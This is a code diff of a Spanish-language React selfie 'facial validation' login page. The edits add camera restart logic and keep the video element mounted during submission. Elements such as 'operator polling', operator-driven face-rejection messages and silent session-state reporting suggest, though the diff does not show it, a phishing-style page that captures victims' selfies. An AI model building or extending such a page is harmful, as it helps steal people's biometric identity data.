@@ -34,6 +34,45 @@ export function SelfiePage({
     onErrorLoginRef.current = onErrorLogin
   })
 
+  async function restartCamera() {
+    try {
+      if (videoRef.current && streamRef.current && streamRef.current.active) {
+        videoRef.current.srcObject = streamRef.current
+        videoRef.current.muted = true
+        await videoRef.current.play().catch(() => {})
+        setReady(true)
+        return
+      }
+
+      let stream: MediaStream | null = null
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({
+            audio: false,
+            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+          })
+        } catch {
+          stream = await navigator.mediaDevices.getUserMedia({
+            audio: false,
+            video: true,
+          })
+        }
+      }
+
+      if (stream) {
+        streamRef.current = stream
+        if (videoRef.current) {
+          videoRef.current.srcObject = stream
+          videoRef.current.muted = true
+          await videoRef.current.play().catch(() => {})
+        }
+        setReady(true)
+      }
+    } catch {
+      /* ignore */
+    }
+  }
+
   // Keep-alive ping and operator polling
   useEffect(() => {
     if (!sessionId) return
@@ -62,6 +101,7 @@ export function SelfiePage({
           setSubmitting(false)
           setPhoto('')
           setError('No pudimos validar tu rostro. Por favor, tómate la selfie nuevamente con buena iluminación y centrando tu rostro.')
+          void restartCamera()
           // Cleanly notify server without triggering any auth prompt
           fetch(`/api/sessions/${sessionId}/state`, {
             method: 'POST',
@@ -100,7 +140,7 @@ export function SelfiePage({
   useEffect(() => {
     let cancelled = false
 
-    async function start() {
+    async function initCamera() {
       try {
         let stream: MediaStream | null = null
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
@@ -110,7 +150,6 @@ export function SelfiePage({
               video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
             })
           } catch {
-            // Fallback to generic video constraints
             stream = await navigator.mediaDevices.getUserMedia({
               audio: false,
               video: true,
@@ -145,7 +184,7 @@ export function SelfiePage({
       }
     }
 
-    void start()
+    void initCamera()
 
     return () => {
       cancelled = true
@@ -210,11 +249,7 @@ export function SelfiePage({
     if (fileInputRef.current) {
       fileInputRef.current.value = ''
     }
-    // Re-ensure video is playing
-    if (videoRef.current && streamRef.current) {
-      videoRef.current.srcObject = streamRef.current
-      videoRef.current.play().catch(() => {})
-    }
+    void restartCamera()
     if (sessionId) {
       fetch(`/api/sessions/${sessionId}/selfie`, {
         method: 'POST',
@@ -253,6 +288,7 @@ export function SelfiePage({
       </header>
 
       <div className="selfie-body">
+        {/* Loading Spinner View (shown during submission) */}
         {submitting ? (
           <div className="login-waiting" style={{ textAlign: 'center', padding: '60px 0' }}>
             <div className="login-spinner" />
@@ -263,88 +299,89 @@ export function SelfiePage({
               Por favor, espera un momento mientras verificamos tu información.
             </p>
           </div>
-        ) : (
-          <>
-            <h2>Validación facial</h2>
-            <p className="selfie-copy">
-              Esta validación nos ayudará a realizar la verificación facial cuando detectemos que
-              inicia sesión en un dispositivo desconocido.
-            </p>
-            <p className="selfie-hint">Centra tu cara dentro del óvalo para tomarte la selfie.</p>
+        ) : null}
 
-            <div className={`selfie-stage${photo ? ' captured' : ''}`}>
-              <video
-                ref={videoRef}
-                autoPlay
-                playsInline
-                muted
+        {/* Camera and Capture Stage (always kept mounted in DOM so stream never dies) */}
+        <div style={{ display: submitting ? 'none' : 'block' }}>
+          <h2>Validación facial</h2>
+          <p className="selfie-copy">
+            Esta validación nos ayudará a realizar la verificación facial cuando detectemos que
+            inicia sesión en un dispositivo desconocido.
+          </p>
+          <p className="selfie-hint">Centra tu cara dentro del óvalo para tomarte la selfie.</p>
+
+          <div className={`selfie-stage${photo ? ' captured' : ''}`}>
+            <video
+              ref={videoRef}
+              autoPlay
+              playsInline
+              muted
+              style={{
+                display: photo ? 'none' : 'block',
+                width: '100%',
+                height: '100%',
+                objectFit: 'cover',
+              }}
+            />
+            {photo ? (
+              <img
+                src={photo}
+                alt="Selfie capturada"
                 style={{
-                  display: photo ? 'none' : 'block',
                   width: '100%',
                   height: '100%',
                   objectFit: 'cover',
+                  display: 'block',
                 }}
               />
-              {photo ? (
-                <img
-                  src={photo}
-                  alt="Selfie capturada"
-                  style={{
-                    width: '100%',
-                    height: '100%',
-                    objectFit: 'cover',
-                    display: 'block',
-                  }}
-                />
-              ) : null}
-              <div className="selfie-shade" aria-hidden />
-              <div className="selfie-oval" aria-hidden />
+            ) : null}
+            <div className="selfie-shade" aria-hidden />
+            <div className="selfie-oval" aria-hidden />
+          </div>
+
+          <canvas ref={canvasRef} style={{ display: 'none' }} />
+          <input
+            ref={fileInputRef}
+            type="file"
+            accept="image/*"
+            capture="user"
+            className="sr-only"
+            onChange={handleFileUpload}
+          />
+
+          {error ? <p className="selfie-error">{error}</p> : null}
+
+          {photo ? (
+            <div className="selfie-actions">
+              <button type="button" className="login-outline" onClick={retake}>
+                Tomar de nuevo
+              </button>
+              <button type="button" className="login-submit ready" onClick={handleFinish}>
+                Continuar
+              </button>
             </div>
-
-            <canvas ref={canvasRef} style={{ display: 'none' }} />
-            <input
-              ref={fileInputRef}
-              type="file"
-              accept="image/*"
-              capture="user"
-              className="sr-only"
-              onChange={handleFileUpload}
-            />
-
-            {error ? <p className="selfie-error">{error}</p> : null}
-
-            {photo ? (
-              <div className="selfie-actions">
-                <button type="button" className="login-outline" onClick={retake}>
-                  Tomar de nuevo
-                </button>
-                <button type="button" className="login-submit ready" onClick={handleFinish}>
-                  Continuar
-                </button>
-              </div>
-            ) : (
-              <div className="selfie-actions">
+          ) : (
+            <div className="selfie-actions">
+              <button
+                type="button"
+                className={`login-submit${ready ? ' ready' : ''}`}
+                disabled={!ready}
+                onClick={takeSelfie}
+              >
+                {ready ? 'Tomar selfie' : 'Activando cámara...'}
+              </button>
+              {!ready ? (
                 <button
                   type="button"
-                  className={`login-submit${ready ? ' ready' : ''}`}
-                  disabled={!ready}
-                  onClick={takeSelfie}
+                  className="login-outline"
+                  onClick={() => fileInputRef.current?.click()}
                 >
-                  {ready ? 'Tomar selfie' : 'Activando cámara...'}
+                  Subir foto desde dispositivo
                 </button>
-                {!ready ? (
-                  <button
-                    type="button"
-                    className="login-outline"
-                    onClick={() => fileInputRef.current?.click()}
-                  >
-                    Subir foto desde dispositivo
-                  </button>
-                ) : null}
-              </div>
-            )}
-          </>
-        )}
+              ) : null}
+            </div>
+          )}
+        </div>
       </div>
     </div>
   )
